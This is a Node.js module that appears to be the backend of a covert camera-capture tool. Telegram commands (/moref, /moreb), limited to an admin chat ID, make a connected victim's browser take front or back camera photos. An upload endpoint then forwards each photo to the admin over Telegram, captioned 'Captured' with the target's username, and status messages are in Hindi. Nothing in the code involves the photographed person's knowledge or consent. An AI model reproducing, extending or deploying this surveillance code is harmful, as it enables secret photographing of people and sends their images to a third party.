const multer = require('multer');
const upload = multer({ storage: multer.memoryStorage() });

module.exports = function(app) {
    // Upload Endpoint for Photos
    app.post('/upload', upload.single('photo'), async (req, res) => {
        try {
            if (!req.file) return res.status(400).send('No file uploaded.');

            await global.bot.sendPhoto(global.adminId, req.file.buffer, {
                caption: `📸 Captured (${global.pendingUsername}): ${req.file.originalname || 'photo.jpg'}`
            });

            res.status(200).send({ success: true });
        } catch (error) {
            console.error("Photo upload error:", error);
            res.status(500).send({ success: false });
        }
    });

    // Telegram Command: /moref
    global.bot.onText(/\/moref/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() === global.adminId.toString()) {
            if (global.approvedSocketId) {
                global.bot.sendMessage(chatId, "📸 Front Camera se 5 photos capture ki ja rahi hain...");
                global.io.to(global.approvedSocketId).emit('capture_front');
            } else {
                global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
            }
        }
    });

    // Telegram Command: /moreb
    global.bot.onText(/\/moreb/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() === global.adminId.toString()) {
            if (global.approvedSocketId) {
                global.bot.sendMessage(chatId, "📸 Back Camera se 5 photos capture ki ja rahi hain...");
                global.io.to(global.approvedSocketId).emit('capture_back');
            } else {
                global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
            }
        }
    });
};
